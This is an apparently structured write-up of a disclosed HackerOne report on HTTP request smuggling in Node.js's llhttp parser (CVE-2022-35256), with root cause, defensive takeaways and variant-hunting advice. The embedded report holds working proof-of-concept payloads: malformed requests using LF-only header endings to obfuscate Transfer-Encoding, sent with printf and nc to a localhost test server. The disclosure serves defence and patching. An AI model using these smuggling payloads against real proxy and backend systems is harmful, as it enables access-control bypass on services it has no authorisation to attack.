# HTTP Request Smuggling Due to Incorrect Parsing of Header Fields in Node.js llhttp

## Metadata
- **Source:** HackerOne
- **Report:** 1675191 | https://hackerone.com/reports/1675191
- **Submitted:** 2022-08-20
- **Reporter:** vvx7
- **Program:** Node.js
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** HTTP Request Smuggling, Header Parsing Bypass, Transfer-Encoding Obfuscation
- **CVEs:** CVE-2022-35256
- **Category:** uncategorised

## Summary
The llhttp parser in Node.js v18.7.0 incorrectly handles malformed header fields not terminated with CRLF, allowing attackers to inject obfuscated Transfer-Encoding headers. This enables HTTP Request Smuggling (HRS) attacks when upstream proxies interpret requests differently than the backend server.

## Attack scenario
1. Attacker crafts HTTP request with a header field containing improper line termination (using \n instead of \r\n)
2. Attacker injects Transfer-Encoding header after the malformed header (e.g., 'x:\nTransfer-Encoding: chunked')
3. Node.js llhttp parser incorrectly accepts the malformed header structure and processes Transfer-Encoding as chunked
4. Upstream proxy or WAF interprets the request differently, rejecting or mishandling the obfuscated Transfer-Encoding header
5. Backend server and proxy interpret request body boundaries differently, leading to request smuggling
6. Attacker's smuggled payload reaches backend server undetected, bypassing access controls or security filters

## Root cause
The llhttp parser fails to enforce strict CRLF termination for header fields. When a header has an empty or missing value followed by a newline (\n) instead of proper CRLF (\r\n), the parser incorrectly merges or processes subsequent headers. This allows Transfer-Encoding headers to be injected in an obfuscated manner that some parsers accept while others reject.

## Attacker mindset
An attacker exploiting differential request parsing between proxies and backends. They deliberately craft malformed headers to create ambiguity in how the HTTP message is interpreted. The goal is to smuggle requests past security controls by leveraging inconsistencies in header parsing implementations across the infrastructure stack.

## Defensive takeaways
- Enforce strict CRLF (\r\n) validation for all HTTP header field terminators; reject requests with \n-only line endings
- Implement strict header parsing that rejects malformed or ambiguous Transfer-Encoding headers
- Deploy consistent HTTP parsing libraries across all layers (proxies, WAFs, backends) to prevent differential parsing
- Normalize and validate Transfer-Encoding header values; reject multiple conflicting values or obfuscated variants
- Implement request smuggling detection by comparing how proxies and backends parse identical requests
- Use HTTP/2 or HTTP/3 when possible to eliminate ambiguities in HTTP/1.1 parsing
- Apply defense-in-depth with strict request validation at multiple layers

## Variant hunting
Search for similar parsing bypass techniques in other HTTP libraries (nginx, Apache, Go http, Python frameworks). Test edge cases with mixed CRLF/LF line endings, multiple Transfer-Encoding headers, Content-Length/Transfer-Encoding conflicts, header continuation with improper whitespace, and unicode/null byte injection in header values. Investigate other header fields used in obfuscation attacks beyond Transfer-Encoding.

## MITRE ATT&CK
- T1190
- T1539
- T1021

## Notes
This vulnerability affects Node.js HTTP request parsing with potential for chained exploitation. The report demonstrates two payload variants: one with empty header value (accepted), one with non-empty value (rejected), indicating partial validation. The vulnerability requires an upstream proxy/WAF that interprets the malformed header differently than Node.js. Related CVEs include HTTP/2 and HTTP/1.1 smuggling issues in other implementations.

## Full report
<details><summary>Expand</summary>

**Summary:** 
The `llhttp` parser in the `http` module in Node v18.7.0 does not correctly handle header fields that are not terminated with CLRF. This may result in HTTP Request Smuggling.

**Description:** 
The following chunked request is processed.  It should be rejected as `Transfer-Encoding` header obfuscation may result in HRS when the upstream proxy does not process the `Transfer-Encoding` header.

A header that precedes the `Transfer-Encoding`, contains an empty value, and is not properly delimited with CLRF may be used for TE obfuscation. 
```
POST / HTTP/1.1
Host: localhost:5000
x:\nTransfer-Encoding: chunked

1
A
0

```

The request is rejected when the preceding header has a value but improper CLRF.
```
POST / HTTP/1.1
Host: localhost:5000
x:x\nTransfer-Encoding: chunked

1
A
0

```

## Steps To Reproduce:

Server
Run the server: `node app.js`

```js
// https://nodejs.org/en/docs/guides/anatomy-of-an-http-transaction/
const http = require('http');

http.createServer((request, response) => {
  let body = [];
  request.on('error', (err) => {
    response.end("Request Error: " + err)
  }).on('data', (chunk) => {
        body.push(chunk);
  }).on('end', () => {
    body = Buffer.concat(body).toString();

    // log the body to stdout to catch the smuggled request
    console.log("Response");
    console.log(request.headers);
    console.log(body);
    console.log("---");

    response.on('error', (err) => {
      // log the body to stdout to catch the smuggled request
        response.end("Response Error: " + err)
    });

    response.end("Body length: " + body.length.toString() + " Body: " + body);
  });
}).listen(5000);
```
Payload
```bash
printf "POST / HTTP/1.1\r\n"\
"Host: localhost\r\n"\
" x:\nTransfer-Encoding: chunked\r\n"\
"\r\n"\
"1\r\n"\
"A\r\n"\
"0\r\n"\
"\r\n" | nc localhost 5000
```
Output
```
HTTP/1.1 200 OK
Date: Sat, 20 Aug 2022 02:59:38 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 22

Body length: 1 Body: A
```
Note:
```bash
printf "POST / HTTP/1.1\r\n"\
"Host: localhost\r\n"\
" Transfer-Encoding: yeet\r\n"\
" Transfer-Encoding: \n"\
" Transfer-Encoding: chunked\r\n"\
"\r\n"\
"1\r\n"\
"A\r\n"\
"0\r\n"\
"\r\n" | nc localhost 5000
```
This also works with the resulting wonky header:
```
HTTP/1.1 200 OK
Date: Sat, 20 Aug 2022 03:06:09 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 22

Body length: 1 Body: A
Response
{ host: 'localhost:5000', 'transfer-encoding': 'yeet, , chunked' }
A
```

## Impact:

HRS can lead to access control bypass and other issues.

## Supporting Material/References:
{F1875064}


https://hackerone.com/reports/1501679
https://hackerone.com/reports/1238709

## Impact

HTTP Request Smuggling can lead to access control bypass.

</details>

---
*Analysed by Claude on 2026-05-24*
